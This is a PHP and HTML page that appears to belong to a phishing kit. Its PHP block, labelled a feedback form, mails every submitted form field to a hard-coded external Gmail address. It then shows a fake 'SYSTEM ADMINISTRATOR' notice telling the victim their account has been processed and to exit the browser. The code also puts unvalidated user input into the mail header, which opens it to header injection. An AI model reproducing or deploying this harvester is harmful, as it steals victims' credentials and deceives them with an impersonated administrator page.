<?php 
$mailto = "benl62565@gmail.com"; 
$subject = "Feedback form"; 
$message = "Values submitted from web site form:"; 
$header = "From: ".$_POST['email']; 
foreach ($_POST as $key => $value)
{ 
   if (!is_array($value))
   { 
      $message .= "\n".$key." : ".$value; 
   } 
   else
   { 
      foreach ($_POST[$key] as $itemvalue)
      { 
         $message .= "\n".$key." : ".$itemvalue; 
      } 
   } 
} 
mail($mailto, $subject, stripslashes($message), $header); 
?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>successful</title>
<meta name="generator" content="WYSIWYG Web Builder - http://www.wysiwygwebbuilder.com">
</head>
<body bgcolor="#00005E" text="#000000">
<div id="wb_Table1" style="position:absolute;left:209px;top:92px;width:564px;height:18px;background-color:#FF0000;z-index:0" align="left">
<table width="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#FF0000" id="Table1">
<tr>
<td align="left" valign="top" width="564" height="18">&nbsp;</td>
</tr>
</table></div>
<div id="wb_Text5" style="position:absolute;left:217px;top:174px;width:538px;height:38px;z-index:1" align="center">
<font style="font-size:16px" color="#FFFFFF" face="Arial"><b>YOUR ACCOUNT&nbsp; IS NOW BEEN PROCESSED <br>
PLEASE EXIT BROW</b></font><font style="font-size:16px" color="#FFFFFF" face="Arial"><b>S</b></font><font style="font-size:16px" color="#FFFFFF" face="Arial"><b>ER</b></font></div>
<div id="wb_Text2" style="position:absolute;left:212px;top:61px;width:304px;height:27px;z-index:2" align="left">
<font style="font-size:24px" color="#E6E6FA" face="Arial">SYSTEM ADMINISTRATOR </font></div>
</body>
</html>